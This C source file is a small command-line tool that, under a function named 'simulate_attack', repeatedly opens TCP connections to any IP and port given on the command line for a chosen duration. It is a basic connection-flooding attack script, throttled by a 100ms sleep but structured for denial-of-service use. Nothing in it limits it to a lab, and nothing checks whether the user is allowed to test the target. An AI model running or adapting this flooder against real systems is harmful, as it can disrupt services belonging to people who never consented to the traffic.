#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <string.h>

void simulate_attack(const char *ip, int port, int duration) {
    int sock;
    struct sockaddr_in server_addr;
    time_t end_time = time(NULL) + duration;

    printf("Starting attack on %s:%d for %d seconds...\n", ip, port, duration);

    while (time(NULL) < end_time) {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            perror("Socket creation failed");
            continue;
        }

        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(port);
        if (inet_pton(AF_INET, ip, &server_addr.sin_addr) <= 0) {
            perror("Invalid IP address");
            close(sock);
            continue;
        }

        if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            perror("Connection failed");
        } else {
            printf("Connected to %s:%d\n", ip, port);
        }

        close(sock);
        usleep(100000); // Sleep for 100ms to avoid overwhelming the system
    }

    printf("Attack completed.\n");
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        printf("Usage: %s <IP> <PORT> <DURATION>\n", argv[0]);
        return 1;
    }

    const char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);

    if (port <= 0 || duration <= 0) {
        printf("Port and duration must be positive integers.\n");
        return 1;
    }

    simulate_attack(ip, port, duration);
    return 0;
}
